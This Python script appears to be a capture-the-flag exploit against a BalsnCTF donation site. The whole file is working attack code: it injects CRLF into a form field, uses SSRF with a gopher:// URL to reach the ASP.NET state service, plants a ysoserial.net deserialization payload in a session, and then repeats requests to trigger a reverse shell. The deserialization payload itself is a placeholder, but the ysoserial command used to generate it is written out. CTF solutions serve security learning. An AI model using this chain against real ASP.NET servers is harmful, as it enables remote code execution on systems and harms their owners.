import requests
import random
import string
import base64
import urllib.parse
import time
from hashlib import sha256


def random_string(string_length=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(string_length))

def sha256_base64encoded(data: str):
    h = sha256()
    h.update(data.encode())
    raw_result = h.digest()
    return base64.b64encode(raw_result).decode()


APP_NAME = '/LM/W3SVC/DONATE/ROOT'

TARGET = 'donate.support.balsnctf.com'

# you have to generate it with ysoserial.net by yourself
# ysoserial.exe -p Altserialization -M HttpStaticObjectsCollection -o base64 -c "<command>"
deserialization_payload = '<payload from ysoserial.net>'
deserialization_payload = b'\x00\x00\x00\x00\x00\x01' + base64.b64decode(deserialization_payload) + b'\xff'

# session id length needs to be 24
session_id = 'cyku' + random_string(20)

# 1. prepare PUT request that will be sent to state service
put_request = b'''PUT %b HTTP/1.1\r
Host: localhost\r
Timeout:1\r
Content-Length:%d\r
ExtraFlags:0\r
LockCookie:%d\r
\r
%b''' % (
    urllib.parse.quote_plus('{0}({1})/{2}'.format(APP_NAME, sha256_base64encoded(APP_NAME), session_id)).encode(),
    len(deserialization_payload),
    random.randint(1,65536),
    deserialization_payload
)


# 2.
# wrap the PUT request with gopher,
# then combine it into POST request that will be sent to virtual host "proxy.support.balsnctf.com"
gopher_url = urllib.parse.quote('gopher://127.0.0.1:42424/_' + urllib.parse.quote(put_request))
proxy_request = '''POST /geturl.php HTTP/1.1\r
Host: proxy.support.balsnctf.com\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {0}\r
\r
url={1}'''.format(len(gopher_url) + 4, gopher_url)


# 3.
# Finally, send it to topdf endpoint of virtual host "donate.support.balsnctf.com"
# inject the request with "Host: proxy.support.balsnctf.com" using CRLF injection
requests.post('http://{0}/Donate/Preview'.format(TARGET), data={
    'token': 'aaaa\r\nHost: localhost\r\n\r\n{0}GET / HTTP/1.1'.format(proxy_request),
    'pdf': '1'
}, headers={
    'Host': 'donate.support.balsnctf.com'
}, timeout=30)

print('Maybe wait 5 seconds to finish SSRF request.')
time.sleep(5)

# 4.
# Request any page with ASP.NET_SessionId cookie, then enjoy your reverse shell
# (May be affected by the lock mechanism of state service, so retry about 10 times)
for i in range(10):
    print('{0} try'.format(i+1))
    requests.get('http://{0}'.format(TARGET), cookies={
        'ASP.NET_SessionId': session_id
    }, headers={
        'Host': 'donate.support.balsnctf.com'
    }, timeout=1)
    time.sleep(1)